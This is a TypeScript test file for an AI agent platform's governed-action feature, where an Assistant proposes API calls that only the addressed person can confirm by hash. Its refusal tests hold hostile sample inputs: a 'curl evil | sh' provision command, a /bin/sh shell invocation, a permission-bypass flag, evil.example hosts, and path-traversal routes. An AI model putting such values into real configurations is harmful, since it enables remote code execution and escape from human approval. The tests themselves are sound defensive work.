import { createHash, randomUUID } from "node:crypto";
import express from "express";
import request from "supertest";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { and, eq } from "drizzle-orm";
import { approvals, authUsers, companyMemberships, heartbeatRuns, issueThreadInteractions, issues } from "@paperclipai/db";
import { issueRoutes } from "../routes/issues.js";
import { errorHandler } from "../middleware/error-handler.js";
import { builtInAgentService } from "../services/built-in-agents.js";
import { createLocalAgentJwt } from "../agent-auth-jwt.js";
import { canonicalJson, matchGovernedRoute, proposedActionHash, ProposedActionError, validateGovernedAction } from "../services/assistant-proposed-actions.js";
import { issueThreadInteractionService } from "../services/issue-thread-interactions.js";
import { buildHostServices } from "../services/plugin-host-services.js";
import type { Db } from "@paperclipai/db";
import { startRunnerApiTestServer } from "./helpers/runner-api-server.js";
import { getEmbeddedPostgresTestSupport } from "./helpers/embedded-postgres.js";

describe("proposed action canonical hashing", () => {
  it("orders keys at every depth, keeps array order and drops undefined members", () => {
    expect(canonicalJson({ b: 1, a: { d: [3, { z: true, y: null }], c: "x" }, u: undefined })).toBe('{"a":{"c":"x","d":[3,{"y":null,"z":true}]},"b":1}');
    expect(canonicalJson([undefined, "é"])).toBe('[null,"é"]');
    expect(() => canonicalJson({ n: Number.NaN })).toThrow(ProposedActionError);
  });

  it("hashes method, path and body so any change produces a different hash", () => {
    const base = { method: "POST", path: "/api/approvals/x/approve", body: { b: 2, a: 1 } };
    const expected = createHash("sha256").update('{"body":{"a":1,"b":2},"method":"POST","path":"/api/approvals/x/approve"}').digest("hex");
    expect(proposedActionHash(base)).toBe(expected);
    expect(proposedActionHash({ ...base, body: { a: 1, b: 2 } })).toBe(expected);
    expect(proposedActionHash({ ...base, method: "PATCH" })).not.toBe(expected);
    expect(proposedActionHash({ ...base, body: null })).toBe(proposedActionHash({ ...base, body: undefined }));
  });
});

describe("governed body restrictions", () => {
  const companyId = "22222222-2222-4222-8222-222222222222";
  // Company-bound paths never touch the database.
  const check = (method: string, path: string, body: unknown) => validateGovernedAction({} as Db, { method, path, body }, companyId);

  it.each([
    [{ name: "Ops", adapterType: "process" }, /adapterType/],
    [{ name: "Ops", adapterType: "http" }, /adapterType/],
    [{ name: "Ops", adapterType: "hermes_local", hermesCommand: "/bin/sh", extraArgs: ["-c", "id"] }, /adapterType|hermesCommand/],
    [{ name: "Ops", adapterType: "hermes_local" }, /adapterType/],
    [{ name: "Ops", adapterType: "plugin:acme/runner" }, /adapterType/],
    [{ name: "Ops", adapterType: "claude_local", adapterConfig: { extraArgs: ["--dangerously-skip-permissions"] } }, /adapterConfig/],
    [{ name: "Ops", adapterType: "claude_local", adapterConfig: { model: "sonnet" } }, /adapterConfig/],
    [{ name: "Ops", adapterType: "claude_local", workspaceStrategy: { provisionCommand: "curl evil | sh" } }, /workspaceStrategy/],
    [{ name: "Ops", adapterType: "claude_local", runtimeConfig: {} }, /runtimeConfig/],
    [{ name: "Ops", adapterType: "claude_local", applyStoredClaudeLogin: true }, /applyStoredClaudeLogin/],
    [{ name: "Ops", adapterType: "claude_local", permissions: { canCreateAgents: true } }, /permissions/],
    [{ name: "Ops", adapterType: "claude_local", instructionsBundle: { files: [] } }, /instructionsBundle/],
    [{ name: "Ops", adapterType: "claude_local", metadata: {} }, /metadata/],
    [{ name: "Ops", adapterType: "claude_local", defaultEnvironmentId: "33333333-3333-4333-8333-333333333333" }, /defaultEnvironmentId/],
    [{ name: "Ops", adapterType: "claude_local", budgetMonthlyCents: 10_000_001 }, /budgetMonthlyCents/],
    [{ name: 42 }, /name/],
  ])("refuses agent create/hire bodies beyond the allowlist (%j)", async (body, message) => {
    for (const path of [`/api/companies/${companyId}/agents`, `/api/companies/${companyId}/agent-hires`]) {
      await expect(check("POST", path, body)).rejects.toThrow(message);
    }
  });

  it("explains where to configure what was refused", async () => {
    await expect(check("POST", `/api/companies/${companyId}/agent-hires`, { name: "Ops", adapterConfig: {} }))
      .rejects.toThrow(/Configure adapters, permissions and instructions in the agent's settings after hiring/);
  });

  it("allows an ordinary agent hire with only allowlisted fields", async () => {
    for (const path of [`/api/companies/${companyId}/agents`, `/api/companies/${companyId}/agent-hires`]) {
      await expect(check("POST", path, { name: "Writer", role: "general", adapterType: "claude_local" })).resolves.toMatchObject({ category: "agent_lifecycle" });
      await expect(check("POST", path, { name: "Writer", title: "Copywriter", icon: "pen", capabilities: "Writes", reportsTo: null, budgetMonthlyCents: 5000 })).resolves.toBeTruthy();
    }
  });

  it.each([-1, 1.5, 10_000_001, "100", null])("refuses budget amount %j", async (amount) => {
    await expect(check("POST", `/api/companies/${companyId}/budgets/policies`, { scopeType: "company", scopeId: companyId, amount })).rejects.toThrow(/amount/);
    await expect(check("PATCH", `/api/companies/${companyId}/budgets`, { budgetMonthlyCents: amount })).rejects.toThrow(/budgetMonthlyCents/);
  });

  it("allows sane budget amounts", async () => {
    await expect(check("POST", `/api/companies/${companyId}/budgets/policies`, { scopeType: "company", scopeId: companyId, amount: 0 })).resolves.toBeTruthy();
    await expect(check("PATCH", `/api/companies/${companyId}/budgets`, { budgetMonthlyCents: 10_000_000 })).resolves.toBeTruthy();
  });

  it("refuses connection create/update proposals; the person sets up connections in Connectors", async () => {
    const id = "33333333-3333-4333-8333-333333333333";
    for (const [method, path] of [
      ["POST", `/api/companies/${companyId}/tools/connections`],
      ["PATCH", `/api/tool-connections/${id}`],
      ["POST", `/api/tool-connections/${id}/grants/installations`],
      ["POST", `/api/tool-connections/${id}/grants/${id}/delegations`],
    ] as const) {
      await expect(check(method, path, { name: "Evil", transportConfig: { url: "https://evil.example" } })).rejects.toThrow(/not a governed action/);
    }
    // Revocations stay proposable only without a body.
    expect(matchGovernedRoute("DELETE", `/api/tool-connections/${id}/grants/${id}`).category).toBe("connection");
    await expect(check("DELETE", `/api/tool-connections/${id}/grants/${id}`, { reason: "x" })).rejects.toThrow(/no request body/);
  });

  it("refuses secret values at any depth", async () => {
    await expect(check("POST", `/api/companies/${companyId}/secrets`, { name: "API", providerMetadata: { inner: [{ value: "sk-live" }] } })).rejects.toThrow(/secret values/);
  });
});

describe("governed route allowlist", () => {
  const id = "11111111-1111-4111-8111-111111111111";
  it.each([
    ["POST", `/api/approvals/${id}/approve`, "approval"],
    ["POST", `/api/approvals/${id}/request-revision`, "approval"],
    ["POST", `/api/companies/${id}/agent-hires`, "agent_lifecycle"],
    ["POST", `/api/agents/${id}/terminate`, "agent_lifecycle"],
    ["POST", `/api/companies/${id}/budgets/policies`, "budget"],
    ["PATCH", `/api/companies/${id}/budgets`, "budget"],
    ["DELETE", `/api/secrets/${id}`, "secret"],
    ["DELETE", `/api/tool-connections/${id}/grants/${id}`, "connection"],
    ["DELETE", `/api/companies/${id}/labels/${id}`, "delete"],
    ["DELETE", `/api/issues/${id}/comments/${id}`, "delete"],
  ])("allows %s %s as %s", (method, path, category) => {
    expect(matchGovernedRoute(method, path).category).toBe(category);
  });

  it.each([
    ["GET", `/api/approvals/${id}`],
    ["POST", `/api/issues/${id}/comments`],
    ["PATCH", `/api/agents/${id}`],
    ["DELETE", `/api/companies/${id}`],
    ["POST", `/api/approvals/${id}/approve?force=true`],
    ["POST", `/api/approvals/${id}/approve/`],
    ["POST", `/api/approvals/${id}%2Fapprove`],
    ["DELETE", `/api/issues/${id}/../../companies/${id}`],
    ["POST", `/api/approvals/not-a-uuid/approve`],
    ["POST", `https://evil.example/api/approvals/${id}/approve`],
    ["POST", `/approvals/${id}/approve`],
  ])("rejects %s %s", (method, path) => {
    expect(() => matchGovernedRoute(method, path)).toThrow(ProposedActionError);
  });
});

const support = await getEmbeddedPostgresTestSupport();
(support.supported ? describe : describe.skip)("staples_propose_action", () => {
  let server: Awaited<ReturnType<typeof startRunnerApiTestServer>>;
  const originalSecret = process.env.PAPERCLIP_AGENT_JWT_SECRET;
  beforeAll(async () => { process.env.PAPERCLIP_AGENT_JWT_SECRET = randomUUID(); server = await startRunnerApiTestServer(); }, 120_000);
  afterAll(async () => {
    await server?.close();
    if (originalSecret === undefined) delete process.env.PAPERCLIP_AGENT_JWT_SECRET; else process.env.PAPERCLIP_AGENT_JWT_SECRET = originalSecret;
  });

  type Fixture = Awaited<ReturnType<typeof server.fixture>>;
  async function assistantFixture() {
    const f = await server.fixture({ conversation: true, disableWakeOnDemand: true });
    const assistant = await builtInAgentService(server.db).ensureAssistant(f.companyId);
    await server.db.update(heartbeatRuns).set({ agentId: assistant.id }).where(eq(heartbeatRuns.id, f.runId));
    await server.db.update(issues).set({ assigneeAgentId: assistant.id, conversationAgentId: assistant.id }).where(eq(issues.id, f.issueId));
    return { ...f, agentId: assistant.id, staffAgentId: f.agentId };
  }
  async function call(f: Fixture, name: string, args: Record<string, unknown>) {
    const token = createLocalAgentJwt(f.agentId, f.companyId, "paperclip_runner", f.runId, f.responsibleUserId)!;
    const response = await fetch(`${server.apiUrl}/api/mcp/assistant-tools`, {
      method: "POST", headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } }),
    });
    const text = await response.text();
    return { status: response.status, body: text ? JSON.parse(text) : null };
  }
  async function pendingApproval(companyId: string) {
    const [row] = await server.db.insert(approvals).values({ companyId, type: "hire_agent", status: "pending", payload: { name: "Writer" } }).returning();
    return row!;
  }
  function personApp(f: Fixture, source: "session" | "assistant_run" | "mcp_oauth", userId = f.responsibleUserId!) {
    const app = express();
    app.use(express.json());
    app.use((req, _res, next) => {
      req.actor = { type: "board", source, userId, companyIds: [f.companyId],
        memberships: [{ companyId: f.companyId, membershipRole: "member", status: "active" }], isInstanceAdmin: false,
        ...(source === "assistant_run" ? { assistantRunId: f.runId } : {}) };
      next();
    });
    app.use("/api", issueRoutes(server.db, server.storage));
    app.use(errorHandler);
    return app;
  }

  it("creates a governed Confirm card on the person's Assistant conversation", async () => {
    const f = await assistantFixture();
    const approval = await pendingApproval(f.companyId);
    const path = `/api/approvals/${approval.id}/approve`;
    const result = await call(f, "staples_propose_action", {
      method: "POST", path, body: { decisionNote: "Looks good" }, summary: "Approve hiring the Writer agent", category: "approval",
      staleCheck: { path: `/api/approvals/${approval.id}`, field: "updatedAt", expected: approval.updatedAt.toISOString() },
    });
    expect(result.status).toBe(200);
    expect(result.body.result.isError, JSON.stringify(result.body)).toBeUndefined();
    const interactionId = result.body.result.structuredContent.interaction.id as string;
    const [row] = await server.db.select().from(issueThreadInteractions).where(eq(issueThreadInteractions.id, interactionId));
    const hash = proposedActionHash({ method: "POST", path, body: { decisionNote: "Looks good" } });
    expect(row).toMatchObject({
      issueId: f.issueId, kind: "request_confirmation", status: "pending", addresseeUserId: f.responsibleUserId,
      createdByAgentId: f.agentId, sourceRunId: f.runId, continuationPolicy: "wake_assignee", effectiveResolverPolicy: "human_only",
    });
    expect(row!.payload).toMatchObject({
      acceptLabel: "Confirm", rejectLabel: "Cancel", prompt: "Approve hiring the Writer agent",
      proposedAction: { version: 1, method: "POST", path, body: { decisionNote: "Looks good" }, category: "approval", hash,
        staleCheck: { path: `/api/approvals/${approval.id}`, field: "updatedAt" } },
    });
    expect((row!.payload as { detailsMarkdown: string }).detailsMarkdown).toContain(`\`${path}\``);
    expect((row!.payload as { detailsMarkdown: string }).detailsMarkdown).toContain('"decisionNote": "Looks good"');
    // Proposing never executes the call.
    const [unchanged] = await server.db.select().from(approvals).where(eq(approvals.id, approval.id));
    expect(unchanged!.status).toBe("pending");
  }, 60_000);

  it("rejects non-allowlisted paths, other-company entities and oversized bodies", async () => {
    const f = await assistantFixture();
    const other = await server.fixture({ disableWakeOnDemand: true });
    const foreign = await pendingApproval(other.companyId);
    const cases: Array<[Record<string, unknown>, RegExp]> = [
      [{ method: "POST", path: `/api/issues/${f.issueId}/comments`, body: { body: "hi" } }, /not a governed action/],
      [{ method: "POST", path: `/api/approvals/${foreign.id}/approve`, body: null }, /this company/],
      [{ method: "PATCH", path: `/api/companies/${other.companyId}/budgets`, body: { budgetMonthlyCents: 1 } }, /this company/],
      [{ method: "DELETE", path: `/api/issues/${other.issueId}`, body: null }, /this company/],
      [{ method: "POST", path: `/api/companies/${f.companyId}/budgets/policies`, body: { blob: "x".repeat(21 * 1024) } }, /larger than|body/],
      [{ method: "POST", path: `/api/companies/${f.companyId}/secrets`, body: { name: "API", value: "sk-live" } }, /secret values/],
      [{ method: "POST", path: `/api/approvals/${(await pendingApproval(f.companyId)).id}/approve`, body: null, staleCheck: { path: `/api/issues/${other.issueId}`, field: "updatedAt", expected: "x" } }, /staleCheck.path must refer to this company/],
    ];
    for (const [args, message] of cases) {
      const result = await call(f, "staples_propose_action", { summary: "Do the thing", ...args });
      expect(result.status).toBe(200);
      expect(result.body.result, JSON.stringify(args).slice(0, 120)).toMatchObject({ isError: true });
      expect(result.body.result.content[0].text).toMatch(message);
    }
    const created = await server.db.select().from(issueThreadInteractions).where(eq(issueThreadInteractions.issueId, f.issueId));
    expect(created).toHaveLength(0);
  }, 60_000);

  it("is a write tool: viewers can neither see nor call it", async () => {
    const f = await assistantFixture();
    await server.db.update(companyMemberships).set({ membershipRole: "viewer" })
      .where(and(eq(companyMemberships.companyId, f.companyId), eq(companyMemberships.principalId, f.responsibleUserId!)));
    const approval = await pendingApproval(f.companyId);
    const result = await call(f, "staples_propose_action", { method: "POST", path: `/api/approvals/${approval.id}/approve`, body: null, summary: "Approve" });
    expect(result.status).toBe(403);
  }, 60_000);

  it("requires the run's issue to be this person's Assistant conversation", async () => {
    const f = await assistantFixture();
    // The run's task is someone else's conversation with the Assistant.
    const otherUserId = `other-${randomUUID()}`;
    await server.db.insert(authUsers).values({ id: otherUserId, name: "Other", email: `${otherUserId}@fixture.invalid`, emailVerified: true, createdAt: new Date(), updatedAt: new Date() });
    await server.db.update(issues).set({ conversationUserId: otherUserId }).where(eq(issues.id, f.issueId));
    const approval = await pendingApproval(f.companyId);
    const result = await call(f, "staples_propose_action", { method: "POST", path: `/api/approvals/${approval.id}/approve`, body: null, summary: "Approve" });
    expect(result.body.result).toMatchObject({ isError: true });
    expect(result.body.result.content[0].text).toMatch(/conversation/);
  }, 60_000);

  it("only the person's own session can confirm, with the matching hash, and the result is recorded", async () => {
    const f = await assistantFixture();
    const approval = await pendingApproval(f.companyId);
    const path = `/api/approvals/${approval.id}/reject`;
    const proposed = await call(f, "staples_propose_action", { method: "POST", path, body: { decisionNote: "Not now" }, summary: "Reject the hire" });
    expect(proposed.body.result.isError, JSON.stringify(proposed.body)).toBeUndefined();
    const { id: interactionId } = proposed.body.result.structuredContent.interaction;
    const { hash } = proposed.body.result.structuredContent.proposedAction;
    const acceptUrl = `/api/issues/${f.issueId}/interactions/${interactionId}/accept`;
    const proposedActionResult = { status: "executed", httpStatus: 200, message: "Rejected", hash };

    for (const source of ["assistant_run", "mcp_oauth"] as const) {
      expect((await request(personApp(f, source)).post(acceptUrl).send({ proposedActionResult })).status).toBe(403);
    }
    expect((await request(personApp(f, "session")).post(acceptUrl).send({})).status).toBe(400);
    expect((await request(personApp(f, "session")).post(acceptUrl).send({ proposedActionResult: { ...proposedActionResult, hash: "0".repeat(64) } })).status).toBe(400);
    // A public create cannot forge a proposal either.
    const forged = await request(personApp(f, "session")).post(`/api/issues/${f.issueId}/interactions`)
      .send({ kind: "request_confirmation", payload: { version: 1, prompt: "x", proposedAction: { version: 1, method: "DELETE", path: `/api/issues/${f.issueId}`, body: null, summary: "x", category: "delete", hash } } });
    expect(forged.status).toBe(422);

    let [row] = await server.db.select().from(issueThreadInteractions).where(eq(issueThreadInteractions.id, interactionId));
    expect(row!.status).toBe("pending");

    // Accept requires a prior claim by the same person.
    expect((await request(personApp(f, "session")).post(acceptUrl).send({ proposedActionResult })).status).toBe(409);
    const claimUrl = `/api/issues/${f.issueId}/interactions/${interactionId}/claim-proposed-action`;
    for (const source of ["assistant_run", "mcp_oauth"] as const) {
      expect((await request(personApp(f, source)).post(claimUrl).send({ hash })).status).toBe(403);
    }
    const claimed = await request(personApp(f, "session")).post(claimUrl).send({ hash });
    expect(claimed.status, JSON.stringify(claimed.body)).toBe(200);
    // A second claim (another tab) is refused while the first is fresh.
    expect((await request(personApp(f, "session")).post(claimUrl).send({ hash })).status).toBe(409);

    const accepted = await request(personApp(f, "session")).post(acceptUrl).send({ proposedActionResult });
    expect(accepted.status, JSON.stringify(accepted.body)).toBe(200);
    [row] = await server.db.select().from(issueThreadInteractions).where(eq(issueThreadInteractions.id, interactionId));
    expect(row).toMatchObject({ status: "accepted", resolvedByUserId: f.responsibleUserId });
    expect(row!.result).toMatchObject({ outcome: "accepted", proposedAction: { status: "executed", httpStatus: 200, message: "Rejected" } });
  }, 60_000);

  async function proposeApproval(f: Fixture) {
    const approval = await pendingApproval(f.companyId);
    const proposed = await call(f, "staples_propose_action", { method: "POST", path: `/api/approvals/${approval.id}/approve`, body: null, summary: "Approve" });
    expect(proposed.body.result.isError, JSON.stringify(proposed.body)).toBeUndefined();
    return { interactionId: proposed.body.result.structuredContent.interaction.id as string, hash: proposed.body.result.structuredContent.proposedAction.hash as string };
  }

  it("claims only for the addressee's own session, with the stored hash", async () => {
    const f = await assistantFixture();
    const { interactionId, hash } = await proposeApproval(f);
    const claimUrl = `/api/issues/${f.issueId}/interactions/${interactionId}/claim-proposed-action`;
    // Someone else in the company, even in their own session.
    const otherUserId = `other-${randomUUID()}`;
    await server.db.insert(authUsers).values({ id: otherUserId, name: "Other", email: `${otherUserId}@fixture.invalid`, emailVerified: true, createdAt: new Date(), updatedAt: new Date() });
    await server.db.insert(companyMemberships).values({ companyId: f.companyId, principalType: "user", principalId: otherUserId, status: "active", membershipRole: "owner" });
    expect((await request(personApp(f, "session", otherUserId)).post(claimUrl).send({ hash })).status).toBe(403);
    expect((await request(personApp(f, "session")).post(claimUrl).send({ hash: "0".repeat(64) })).status).toBe(400);
    expect((await request(personApp(f, "session")).post(claimUrl).send({ hash })).status).toBe(200);
  }, 60_000);

  it("refuses to claim a stored proposal that is not allowlisted or whose hash does not match its call", async () => {
    const f = await assistantFixture();
    const { interactionId } = await proposeApproval(f);
    const [row] = await server.db.select().from(issueThreadInteractions).where(eq(issueThreadInteractions.id, interactionId));
    const payload = row!.payload as Record<string, any>;
    const claimUrl = `/api/issues/${f.issueId}/interactions/${interactionId}/claim-proposed-action`;

    // A forged non-allowlisted call with a self-consistent hash.
    const forgedCall = { method: "POST", path: `/api/issues/${f.issueId}/comments`, body: { body: "hi" } };
    const forgedHash = proposedActionHash(forgedCall);
    await server.db.update(issueThreadInteractions).set({ payload: { ...payload, proposedAction: { ...payload.proposedAction, ...forgedCall, hash: forgedHash } } as never })
      .where(eq(issueThreadInteractions.id, interactionId));
    expect((await request(personApp(f, "session")).post(claimUrl).send({ hash: forgedHash })).status).toBe(422);

    // A stored hash that does not describe the stored call.
    await server.db.update(issueThreadInteractions).set({ payload: { ...payload, proposedAction: { ...payload.proposedAction, body: { decisionNote: "swapped" } } } as never })
      .where(eq(issueThreadInteractions.id, interactionId));
    expect((await request(personApp(f, "session")).post(claimUrl).send({ hash: payload.proposedAction.hash })).status).toBe(422);
  }, 60_000);

  it("lets the same person re-claim a stale claim after five minutes", async () => {
    const f = await assistantFixture();
    const { interactionId, hash } = await proposeApproval(f);
    const claimUrl = `/api/issues/${f.issueId}/interactions/${interactionId}/claim-proposed-action`;
    expect((await request(personApp(f, "session")).post(claimUrl).send({ hash })).status).toBe(200);
    expect((await request(personApp(f, "session")).post(claimUrl).send({ hash })).status).toBe(409);
    const [row] = await server.db.select().from(issueThreadInteractions).where(eq(issueThreadInteractions.id, interactionId));
    const payload = row!.payload as Record<string, any>;
    await server.db.update(issueThreadInteractions).set({ payload: { ...payload, proposedActionClaim: { ...payload.proposedActionClaim, claimedAt: new Date(Date.now() - 6 * 60_000).toISOString() } } as never })
      .where(eq(issueThreadInteractions.id, interactionId));
    expect((await request(personApp(f, "session")).post(claimUrl).send({ hash })).status).toBe(200);
  }, 60_000);

  it("only the Assistant tool may create proposedAction interactions (service and plugin paths refuse)", async () => {
    const f = await assistantFixture();
    const [issue] = await server.db.select().from(issues).where(eq(issues.id, f.issueId));
    const forged = {
      kind: "request_confirmation" as const,
      addresseeUserId: f.responsibleUserId,
      payload: { version: 1 as const, prompt: "Delete it", proposedAction: { version: 1 as const, method: "DELETE" as const, path: `/api/issues/${f.issueId}`, body: null, summary: "Delete", category: "delete" as const, hash: proposedActionHash({ method: "DELETE", path: `/api/issues/${f.issueId}`, body: null }) } },
    };
    await expect(issueThreadInteractionService(server.db).create(issue!, forged, { agentId: f.staffAgentId })).rejects.toThrow(/proposedAction is server-owned/);
    const eventBus = { forPlugin: () => ({ emit: () => undefined, subscribe: () => undefined }) } as never;
    const plugin = buildHostServices(server.db, "plugin-record-id", "test-plugin", eventBus);
    await expect(plugin.issues.createInteraction({ companyId: f.companyId, issueId: f.issueId, interaction: forged as never, authorAgentId: f.staffAgentId }))
      .rejects.toThrow(/proposedAction is server-owned/);
    const created = await server.db.select().from(issueThreadInteractions).where(eq(issueThreadInteractions.issueId, f.issueId));
    expect(created).toHaveLength(0);
  }, 60_000);

  it("wakes the Assistant: a conversation's assignee is always its conversation agent", async () => {
    const f = await assistantFixture();
    // The continuation wake targets issue.assigneeAgentId. The schema pins it
    // to conversationAgentId (the Assistant); the tool also refuses otherwise.
    await expect(server.db.update(issues).set({ assigneeAgentId: f.staffAgentId }).where(eq(issues.id, f.issueId)))
      .rejects.toMatchObject({ cause: expect.objectContaining({ constraint_name: "issues_conversation_identity_check" }) });
    const { interactionId, hash } = await proposeApproval(f);
    const claimUrl = `/api/issues/${f.issueId}/interactions/${interactionId}/claim-proposed-action`;
    expect((await request(personApp(f, "session")).post(claimUrl).send({ hash })).status).toBe(200);
    const [row] = await server.db.select().from(issueThreadInteractions).where(eq(issueThreadInteractions.id, interactionId));
    const [issue] = await server.db.select().from(issues).where(eq(issues.id, f.issueId));
    expect(row!.continuationPolicy).toBe("wake_assignee");
    expect(issue!.assigneeAgentId).toBe(f.agentId);
  }, 60_000);
});
